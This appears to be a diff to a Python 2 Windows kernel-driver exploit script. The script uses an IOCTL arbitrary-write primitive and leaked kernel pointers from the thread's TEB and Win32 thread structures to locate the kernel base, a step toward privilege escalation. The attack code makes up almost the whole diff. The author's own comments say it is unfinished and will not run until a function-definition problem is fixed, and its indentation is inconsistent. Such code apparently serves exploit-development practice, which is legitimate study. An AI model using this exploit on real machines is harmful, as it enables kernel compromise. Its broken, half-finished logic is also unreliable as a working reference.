@@ -93,42 +93,50 @@ def writeQWORD(driver, what=None, where=None):
     print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
+# Definitions for the GetCurrentThread()
 ThreadHandle = kernel32.GetCurrentThread()
 ThreadInformation = THREAD_BASIC_INFORMATION()
 ThreadInformationClass = ThreadBasicInformation
 ThreadInformationLength = sizeof(ThreadInformation)
 ReturnLength = c_ulonglong(0)
 
-dwStatus = ntdll.NtQueryInformationThread(ThreadHandle, ThreadInformationClass, byref(ThreadInformation), ThreadInformationLength, byref(ReturnLength))
-if dwStatus != STATUS_SUCCESS:
-	print("Something went wrong","e")
-	sys.exit()
+def readKernelValue():
+	#Call to defined NTQueryInformationThread
+	dwStatus = ntdll.NtQueryInformationThread(ThreadHandle, ThreadInformationClass, byref(ThreadInformation), ThreadInformationLength, byref(ReturnLength))
+	if dwStatus != STATUS_SUCCESS:
+		print("Something went wrong","e")
+		sys.exit()
 
-teb = ThreadInformation.TebBaseAddress
-Win32ThreadInfo = teb + 0x78
-W32THREADNONPAGED = leakQWORD(Win32ThreadInfo, driver)
-W32THREAD = leakQWORD(W32THREADNONPAGED.value, driver)
-nt_EmpCheckErrataList = leakQWORD(W32THREAD.value + 0x2a8, driver)
-baseAddr = 0
-signature = 0x00905a4d
-searchAddr = nt_EmpCheckErrataList.value & 0xFFFFFFFFFFFFF000
+	#Parse TEB with offsets
+	teb = ThreadInformation.TebBaseAddress
+	Win32ThreadInfo = teb + 0x78
+			    #this function needs rewritten as a read?
+	W32THREADNONPAGED = leakQWORD(Win32ThreadInfo, driver)
+		     #needs rewritten as a read?
+	W32THREAD = leakQWORD(W32THREADNONPAGED.value, driver)
+				#needs rewritten as a read?
+	nt_EmpCheckErrataList = leakQWORD(W32THREAD.value + 0x2a8, driver)
+	baseAddr = 0
+	signature = 0x00905a4d
+	searchAddr = nt_EmpCheckErrataList.value & 0xFFFFFFFFFFFFF000
 
-while True: 
-	readData = writeQWORD(searchAddr, driver)
-	tmp = readData.value & 0xFFFFFFFF
-	if tmp == signature: 
-		baseAddr = searchAddr
-		break
-	searchAddr = searchAddr - 0x1000
+	while True: 
+			   #I think this can actually be our write?
+		readData = leakQWORD(searchAddr, driver)
+		tmp = readData.value & 0xFFFFFFFF
+		if tmp == signature: 
+			baseAddr = searchAddr
+			break
+		searchAddr = searchAddr - 0x1000
 
-	print "TEB address is: 0x%x" % teb
-	print "Win32ThreadInfo address is: 0x%x" % Win32ThreadInfo
-	print "W32THREADNONPAGED address is: 0x%x" % W32THREADNONPAGED.value
-	print "W32THREAD address is: 0x%x" % W32THREAD.value
-	print "nt!EmpCheckErrataList address is: 0x%x" % nt_EmpCheckErrataList.value
-	return baseAddr
-
-
+		#print items
+		print "TEB address is: 0x%x" % teb
+		print "Win32ThreadInfo address is: 0x%x" % Win32ThreadInfo
+		print "W32THREADNONPAGED address is: 0x%x" % W32THREADNONPAGED.value
+		print "W32THREAD address is: 0x%x" % W32THREAD.value
+		print "nt!EmpCheckErrataList address is: 0x%x" % nt_EmpCheckErrataList.value
+		#return for further parsing
+		return baseAddr
 
 # Exploit the driver
 def executeOverwrite():
@@ -138,7 +146,10 @@ def executeOverwrite():
         sys.exit()
     else:
         print "[X] Got handle to the driver.\n"
+	#This will not run until leakQWORD() definition problem is resolved.
+	readKernelValue()
         writeQWORD(driver_handle, 0x4142434445464748, 0x000000001a002000)
+	
 
         
 executeOverwrite()
